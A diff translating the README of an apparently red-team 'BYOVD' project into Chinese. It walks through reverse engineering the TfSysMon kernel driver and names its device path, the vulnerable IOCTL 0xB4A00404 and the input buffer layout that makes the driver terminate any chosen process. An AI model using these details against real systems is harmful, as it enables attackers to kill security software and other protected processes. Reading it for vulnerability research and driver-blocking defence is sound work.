+- 代码使用 BugCheckParameter2 和 BugCheckParameter3 进行一些初始化
+- 真正的驱动程序初始化发生在 `sub_17484` 中
+- 跟随对 `sub_17484(DriverObject)` 的调用——这是实际驱动程序设置发生的地方
 
-### 📍 Step 2: Follow Driver Initialization Chain
+### 📍 步骤 2：跟随驱动程序初始化链
 
-**Navigate to the initialization function (`sub_17484`):**
+**导航到初始化函数（`sub_17484`）：**
 
 ```c
 NTSTATUS __fastcall sub_17484(PDRIVER_OBJECT DriverObject, unsigned __int16 *a2)
 {
-  // ... initialization code ...
+  // ... 初始化代码 ...
   
   RtlInitUnicodeString(&DestinationString, L"\\Device\\TfSysMon");
   result = IoCreateDevice(DriverObject, 0, &DestinationString, 0x22u, 0x100u, 0, &DeviceObject);
@@ -316,20 +310,20 @@ NTSTATUS __fastcall sub_17484(PDRIVER_OBJECT DriverObject, unsigned __int16 *a2)
   
   RtlInitUnicodeString(&SymbolicLinkName, L"\\DosDevices\\TfSysMon");
   v6 = IoCreateSymbolicLink(&SymbolicLinkName, &DestinationString);
-  // ... rest of function ...
+  // ... 函数其余部分 ...
 }
 ```
 
-**Key Reverse Engineering Findings:**
-- **Device Name**: `\\Device\\TfSysMon` (kernel space)
-- **Symbolic Link**: `\\DosDevices\\TfSysMon` (user-mode accessible as `\\.\\TfSysMon`)
-- **Device Type**: `0x22` = FILE_DEVICE_UNKNOWN
-- **IRP Handler**: All major functions point to `sub_17694`
-- **Target Function**: MajorFunction[14] = IRP_MJ_DEVICE_CONTROL handler
+**关键逆向工程发现：**
+- **设备名称**：`\\Device\\TfSysMon`（内核空间）
+- **符号链接**：`\\DosDevices\\TfSysMon`（用户模式可访问为 `\\.\\TfSysMon`）
+- **设备类型**：`0x22` = FILE_DEVICE_UNKNOWN
+- **IRP 处理程序**：所有主功能都指向 `sub_17694`
+- **目标函数**：MajorFunction[14] = IRP_MJ_DEVICE_CONTROL 处理程序
 
-### 📍 Step 3: Analyze the IRP Dispatch Function
+### 📍 步骤 3：分析 IRP 分发函数
 
-**Navigate to the dispatch function (`sub_17694`):**
+**导航到分发函数（`sub_17694`）：**
 
 ```c
 __int64 __fastcall sub_17694(struct _DEVICE_OBJECT *a1, IRP *a2)
@@ -346,11 +340,11 @@ __int64 __fastcall sub_17694(struct _DEVICE_OBJECT *a1, IRP *a2)
   v4 = 0;
   if ( !CurrentStackLocation->MajorFunction )
   {
-    // Handle IRP_MJ_CREATE
+    // 处理 IRP_MJ_CREATE
   }
   else if ( CurrentStackLocation->MajorFunction == 2 )
   {
-    // Handle IRP_MJ_CLOSE
+    // 处理 IRP_MJ_CLOSE
   }
   else if ( CurrentStackLocation->MajorFunction <= 0xDu )
   {
@@ -358,31 +352,31 @@ __int64 __fastcall sub_17694(struct _DEVICE_OBJECT *a1, IRP *a2)
   }
   else if ( CurrentStackLocation->MajorFunction <= 0xFu )
   {
-    v4 = sub_177D8(a2);  // THIS IS THE IOCTL HANDLER
+    v4 = sub_177D8(a2);  // 这是 IOCTL 处理程序
     goto LABEL_20;
   }
-  // ... rest of function
+  // ... 函数其余部分
 }
 ```
 
-**Reverse Engineering Analysis:**
-- Device validation occurs first (`if ( a1 != DeviceObject )`)
-- `CurrentStackLocation->MajorFunction` determines the operation type
-- **CRITICAL**: MajorFunction values 14 (0xE) and 15 (0xF) call `sub_177D8`
-- MajorFunction 14 = IRP_MJ_DEVICE_CONTROL = IOCTL processing
-- The vulnerable code path is: **IOCTL request → sub_177D8**
+**逆向工程分析：**
+- 首先进行设备验证（`if ( a1 != DeviceObject )`）
+- `CurrentStackLocation->MajorFunction` 确定操作类型
+- **关键**：MajorFunction 值 14（0xE）和 15（0xF）调用 `sub_177D8`
+- MajorFunction 14 = IRP_MJ_DEVICE_CONTROL = IOCTL 处理
+- 漏洞代码路径为：**IOCTL 请求 → sub_177D8**
 
-### 📍 Step 4: Reverse Engineer the IOCTL Handler
+### 📍 步骤 4：逆向工程 IOCTL 处理程序
 
-**Navigate to the IOCTL processing function (`sub_177D8`):**
+**导航到 IOCTL 处理函数（`sub_177D8`）：**
 
 ```c
 __int64 __fastcall sub_177D8(PIRP Irp, __int64 a2, __int64 a3, __int64 a4)
 {
-  // ... variable declarations ...
+  // ... 变量声明 ...
   
-  v7 = *(_DWORD *)(a2 + 24);  // Extract IOCTL code
-  MasterIrp = Irp->AssociatedIrp.MasterIrp;  // Input buffer
+  v7 = *(_DWORD *)(a2 + 24);  // 提取 IOCTL 代码
+  MasterIrp = Irp->AssociatedIrp.MasterIrp;  // 输入缓冲区
   v9 = *(unsigned int *)(a2 + 16);  // InputBufferLength
   v10 = *(_DWORD *)(a2 + 8);  // OutputBufferLength
   
@@ -394,30 +388,30 @@ __int64 __fastcall sub_177D8(PIRP Irp, __int64 a2, __int64 a3, __int64 a4)
       {
         switch ( v7 )
         {
-          // ... various cases ...
-          case 0xB4A00404:  // VULNERABLE IOCTL CODE
+          // ... 各种 case ...
+          case 0xB4A00404:  // 漏洞 IOCTL 代码
             if ( (unsigned int)v9 >= 0x18 )
               return (unsigned int)sub_1837C((__int64)Irp->AssociatedIrp.MasterIrp);
             break;
-          // ... more cases ...
+          // ... 更多 case ...
         }
       }
     }
   }
-  // ... rest of function
+  // ... 函数其余部分
 }
 ```
 
-**Critical Reverse Engineering Discoveries:**
-- **IOCTL Extraction**: `v7 = *(_DWORD *)(a2 + 24)` gets the IOCTL code from IO_STACK_LOCATION
-- **Input Buffer**: `Irp->AssociatedIrp.MasterIrp` contains user data
-- **Buffer Length**: `v9 = *(unsigned int *)(a2 + 16)` gets input buffer size
-- **Vulnerable IOCTL**: `0xB4A00404` leads to `sub_1837C`
-- **Size Check**: Only validates buffer ≥ 0x18 (24 bytes) - minimal validation!
+**关键逆向工程发现：**
+- **IOCTL 提取**：`v7 = *(_DWORD *)(a2 + 24)` 从 IO_STACK_LOCATION 获取 IOCTL 代码
+- **输入缓冲区**：`Irp->AssociatedIrp.MasterIrp` 包含用户数据
+- **缓冲区长度**：`v9 = *(unsigned int *)(a2 + 16)` 获取输入缓冲区大小
+- **漏洞 IOCTL**：`0xB4A00404` 导向 `sub_1837C`
+- **大小检查**：仅验证缓冲区 ≥ 0x18（24 字节）——验证极少！
 
-### 📍 Step 5: Analyze the Vulnerable Function
+### 📍 步骤 5：分析漏洞函数
 
-**Navigate to the process termination function (`sub_1837C`):**
+**导航到进程终止函数（`sub_1837C`）：**
 
 ```c
 __int64 __fastcall sub_1837C(__int64 a1)
@@ -426,12 +420,12 @@ __int64 __fastcall sub_1837C(__int64 a1)
   void *v3; // rax
   unsigned int v4; // edi
   NTSTATUS v6; // eax
-  // ... variable declarations ...
+  // ... 变量声明 ...
   
   v2 = 0;
   if ( MmIsAddressValid((PVOID)a1) )
   {
-    v3 = *(void **)(a1 + 4);  // EXTRACT PID FROM OFFSET +4
+    v3 = *(void **)(a1 + 4);  // 从偏移 +4 提取 PID
     v4 = 0;
     if ( !v3 )
       return 3221225485LL;
@@ -440,7 +434,7 @@ __int64 __fastcall sub_1837C(__int64 a1)
     ObjectAttributes.SecurityQualityOfService = 0;
     ClientId.UniqueThread = 0;
     ObjectAttributes.Length = 48;
-    ClientId.UniqueProcess = v3;  // SET TARGET PID
+    ClientId.UniqueProcess = v3;  // 设置目标 PID
     while ( 1 )
     {
       v6 = ZwOpenProcess(&ProcessHandle, 1u, &ObjectAttributes, &ClientId);
@@ -460,7 +454,7 @@ __int64 __fastcall sub_1837C(__int64 a1)
       v9 = 0;
       do
       {
-        v2 = ZwTerminateProcess(ProcessHandle, 0);  // TERMINATE PROCESS
+        v2 = ZwTerminateProcess(ProcessHandle, 0);  // 终止进程
         if ( !v2 )
           break;
         v10 = v9++;
@@ -473,50 +467,50 @@ __int64 __fastcall sub_1837C(__int64 a1)
 }
 ```
 
-**Function Analysis:**
-- **Input Structure**: From the driver code analysis, we determined the buffer layout where PID is at offset +4
-- **Input Parsing**: `v3 = *(void **)(a1 + 4)` extracts PID from input buffer at offset +4
-- **Process Opening**: `ZwOpenProcess` with minimal access rights (1u = PROCESS_TERMINATE)
-- **No Security Checks**: No validation of caller privileges or target process protection
-- **Process Termination**: Direct call to `ZwTerminateProcess` 
-- **Retry Logic**: Multiple attempts for both opening and termination
-- **Any Process**: Can terminate any process accessible to SYSTEM account
+**函数分析：**
+- **输入结构**：从驱动程序代码分析中，我们确定了缓冲区布局，其中 PID 位于偏移 +4
+- **输入解析**：`v3 = *(void **)(a1 + 4)` 从输入缓冲区偏移 +4 处提取 PID
+- **进程打开**：`ZwOpenProcess` 使用最小访问权限（1u = PROCESS_TERMINATE）
+- **无安全检查**：不验证调用者权限或目标进程保护
+- **进程终止**：直接调用 `ZwTerminateProcess` 
+- **重试逻辑**：打开和终止均多次尝试
+- **任意进程**：可以终止 SYSTEM 账户可访问的任何进程
 
-### 📍 Step 6: Map the Complete Attack Chain
+### 📍 步骤 6：映射完整攻击链
 
-**Complete Reverse Engineering Flow:**
-1. **Entry Point**: User calls `DeviceIoControl` on `\\.\\TfSysMon`
-2. **IRP Creation**: I/O Manager creates IRP with MajorFunction = 14
-3. **Dispatch**: `sub_17694` routes to `sub_177D8` for IOCTL processing
-4. **IOCTL Check**: `sub_177D8` validates IOCTL code `0xB4A00404` and buffer size ≥ 24 bytes
-5. **Execution**: Calls `sub_1837C` with user input buffer
-6. **Termination**: `sub_1837C` extracts PID from offset +4 and terminates process via `ZwTerminateProcess`
+**完整逆向工程流程：**
+1. **入口点**：用户对 `\\.\\TfSysMon` 调用 `DeviceIoControl`
+2. **IRP 创建**：I/O 管理器创建 MajorFunction = 14 的 IRP
+3. **分发**：`sub_17694` 将 IOCTL 处理路由到 `sub_177D8`
+4. **IOCTL 检查**：`sub_177D8` 验证 IOCTL 代码 `0xB4A00404` 和缓冲区大小 ≥ 24 字节
+5. **执行**：使用用户输入缓冲区调用 `sub_1837C`
+6. **终止**：`sub_1837C` 从偏移 +4 提取 PID 并通过 `ZwTerminateProcess` 终止进程
 
-**Input Buffer Structure (from driver reverse engineering):**
+**输入缓冲区结构（来自驱动程序逆向工程）：**
 ```
-Offset 0x00-0x03: [padding] - 4 bytes
-Offset 0x04-0x07: [Target Process ID] - 4 bytes (DWORD)  
-Offset 0x08-0x17: [extra_padding] - 16 bytes
-Total Size: 24 bytes (0x18) - matches driver's minimum size check
+偏移 0x00-0x03: [填充] - 4 字节
+偏移 0x04-0x07: [目标进程 ID] - 4 字节（DWORD）  
+偏移 0x08-0x17: [额外填充] - 16 字节
+总大小：24 字节（0x18）—— 与驱动程序的最小大小检查匹配
 ```
 
 
-> This methodology demonstrates how to systematically reverse engineer any Windows x64 kernel driver to identify similar vulnerabilities by following the execution path from user-mode communication through to dangerous kernel operations.
+> 该方法论演示了如何系统地逆向工程任何 Windows x64 内核驱动程序，通过跟踪从用户模式通信到危险内核操作的执行路径来识别类似漏洞。
 
-## Support 🍺
+## 支持 🍺
 
-If BYOVD helped your red team operations, consider buying me a beer:
+如果 BYOVD 帮助了你的红队行动，考虑请我喝杯啤酒：
 
 <a href="https://www.buymeacoffee.com/blacksnufkin"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" width="200" height="60"></a>
 
 
 
-## 🔗 References
-- **Alice Climent-Pommeret's Blog**: [Finding and Exploiting Process Killer Drivers with LOL for $3000](https://alice.climent-pommeret.red/posts/process-killer-driver/)
-- **LOLDrivers**: [A Central Repository of Known Vulnerable Drivers](https://www.loldrivers.io/)
-- **Microsoft Driver Block Rules**: [Microsoft's Recommended Driver Block Rules](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/microsoft-recommended-driver-block-rules)
-- **Windows Kernel Programming** by Pavel Yosifovich
-- **Windows Internals, Part 1 & 2** by Mark E. Russinovich, Alex Ionescu, David Solomon
+## 🔗 参考资料
+- **Alice Climent-Pommeret 的博客**：[Finding and Exploiting Process Killer Drivers with LOL for $3000](https://alice.climent-pommeret.red/posts/process-killer-driver/)
+- **LOLDrivers**：[已知漏洞驱动程序的中央仓库](https://www.loldrivers.io/)
+- **微软驱动程序阻止规则**：[微软推荐的驱动程序阻止规则](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/microsoft-recommended-driver-block-rules)
+- **Windows 内核编程**，作者 Pavel Yosifovich
+- **Windows Internals, Part 1 & 2**，作者 Mark E. Russinovich、Alex Ionescu、David Solomon
 
-## ⚠️ Disclaimer
-**The BYOVD Project** is for **educational and research purposes only**. The author is not responsible for any misuse or damage caused by these programs. Always seek explicit permission before using these tools on any system.
+## ⚠️ 免责声明
+**BYOVD 项目** 仅供 **教育和研究目的**。作者不对这些程序造成的任何滥用或损害负责。在任何系统上使用这些工具之前，请务必获得明确许可。
